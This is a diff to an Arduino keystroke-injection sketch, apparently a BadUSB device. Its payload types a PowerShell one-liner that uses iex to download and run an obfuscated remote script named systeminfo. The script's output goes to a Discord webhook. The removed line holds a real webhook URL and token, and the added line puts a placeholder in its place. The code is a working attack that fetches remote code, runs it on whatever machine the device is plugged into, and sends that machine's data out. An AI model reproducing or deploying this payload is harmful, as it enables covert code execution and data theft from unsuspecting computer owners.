@@ -1,6 +1,6 @@
 #include <Keyboard.h>
 
-const char* payload = "iex \"& {$(irm https://raw.githubusercontent.com/calinux-py/Arduino/refs/heads/main/systeminfo/obfu_systeminfo.ps1)} 'https://discordapp.com/api/webhooks/1402034661315711026/avtKsK4geh1w0G3NiG0I2C99JGXbq9aacI0EOKJF3_u9WghZAdgJLQe3T5hsPyFmkWOq'\"";
+const char* payload = "iex \"& {$(irm https://raw.githubusercontent.com/calinux-py/Arduino/refs/heads/main/systeminfo/obfu_systeminfo.ps1)} 'https://discordapp.com/api/webhooks/YOU_WEBHOOK'\"";
 
 void setup() {
   Keyboard.begin();
@@ -24,4 +24,5 @@ void setup() {
   Keyboard.releaseAll();
   Keyboard.end();
 }
+
 void loop() {}
